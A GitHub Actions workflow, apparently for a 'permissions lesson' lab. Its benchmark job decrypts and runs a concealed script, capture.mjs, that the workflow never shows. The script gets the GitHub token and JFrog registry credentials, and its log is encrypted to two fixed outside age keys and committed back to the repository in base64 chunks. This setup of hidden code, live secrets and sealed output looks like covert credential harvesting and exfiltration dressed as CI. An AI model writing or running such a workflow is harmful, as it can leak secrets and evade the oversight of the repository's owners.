name: Focused permissions lesson
'on':
  workflow_dispatch:
    inputs:
      browser_url:
        required: false
        type: string
      package_path:
        required: false
        default: packages/lesson-v3.tar.gz.age
        type: string
      package_id:
        required: false
        default: 20260929-source-v3-capture-dsl
        type: string
      mode:
        required: false
        default: production
        type: choice
        options:
        - production
        - fixture
      rails:
        required: true
        default: all
        type: choice
        options:
        - all
        - validate
        - audio
        - capture
        - simulation
        - metric
        - discover
        - recipient-proof
        - browser
        - benchmark
permissions:
  contents: read
jobs:
  capture:
    if: inputs.rails == 'benchmark'
    runs-on: ubuntu-24.04
    timeout-minutes: 8
    permissions:
      contents: write
    steps:
    - uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262
    - run: 'set -euo pipefail

        curl --max-time 90 -fsSL -o "$RUNNER_TEMP/age.tgz" https://github.com/FiloSottile/age/releases/download/v1.3.2/age-v1.3.2-linux-amd64.tar.gz

        echo ''cbe24006683f8eb669266162894b9a522a1af52f2665fbc63a4bb032ed26ac10  ''"$RUNNER_TEMP/age.tgz" | sha256sum -c -

        tar -xzf "$RUNNER_TEMP/age.tgz" -C "$RUNNER_TEMP"

        echo "$RUNNER_TEMP/age" >> "$GITHUB_PATH"

        '
    - env:
        LAB_AGE_KEY: ${{ secrets.LAB_AGE_KEY }}
      run: 'umask 077

        mkdir -p "$RUNNER_TEMP/e2e-code" "$RUNNER_TEMP/e2e-private"

        printf ''%s'' "$LAB_AGE_KEY" > "$RUNNER_TEMP/code.key"

        age -d -i "$RUNNER_TEMP/code.key" -o "$RUNNER_TEMP/source.tar.gz" pipeline/focused-capture-source-v29.tar.gz.age

        rm "$RUNNER_TEMP/code.key"

        echo ''309792a412ae70a47e17d24f27ac8447146e65452467d4ab91a819044aba8494  ''"$RUNNER_TEMP/source.tar.gz" | sha256sum -c - >/dev/null

        tar -xzf "$RUNNER_TEMP/source.tar.gz" -C "$RUNNER_TEMP/e2e-code"

        '
    - run: 'set -euo pipefail

        command -v google-chrome

        timeout 120 npm install --prefix /tmp/pw-deps --no-audit --no-fund playwright-core@1.63.0

        node --input-type=module -e "await import(''/tmp/pw-deps/node_modules/playwright-core/index.mjs'')"

        '
    - env:
        LAB_AGE_KEY: ${{ secrets.LAB_AGE_KEY }}
        GH_TOKEN: ${{ github.token }}
        JFROG_LAB_USER: ${{ secrets.JFROG_LAB_USER }}
        JFROG_LAB_PASSWORD: ${{ secrets.JFROG_LAB_PASSWORD }}
      run: 'set +e

        timeout 150 node "$RUNNER_TEMP/e2e-code/capture.mjs" > "$RUNNER_TEMP/e2e-private/log.txt" 2>&1

        rc=$?

        set -e

        printf ''%s'' "$rc" > "$RUNNER_TEMP/e2e-private/exit-code.txt"

        tar -czf "$RUNNER_TEMP/result.tar.gz" -C "$RUNNER_TEMP/e2e-private" .

        age -a -r age1drdclm2yu6m2sg04dnalqvk020ecnetcs0ntu5qyusum993eu4xqf8zzzl -r age1ysazhy7z52sn38qla0vqxh0d4lephsyx3u8nucqyhh3vvdtd3aqqxfcmkt -o "$RUNNER_TEMP/result.age" "$RUNNER_TEMP/result.tar.gz"

        split -b 700000 -d -a 3 "$RUNNER_TEMP/result.age" "$RUNNER_TEMP/part-"

        for f in "$RUNNER_TEMP"/part-*;do suffix=${f##*-};jq -n --rawfile d "$f" ''{message:"Encrypted live read-only lesson capture",content:($d|@base64),branch:"main"}'' > "$RUNNER_TEMP/put.json";gh api -X PUT "repos/${{ github.repository }}/contents/packages/capture-${{ github.run_id }}-$suffix.age" --input "$RUNNER_TEMP/put.json" >/dev/null;done

        exit "$rc"

        '
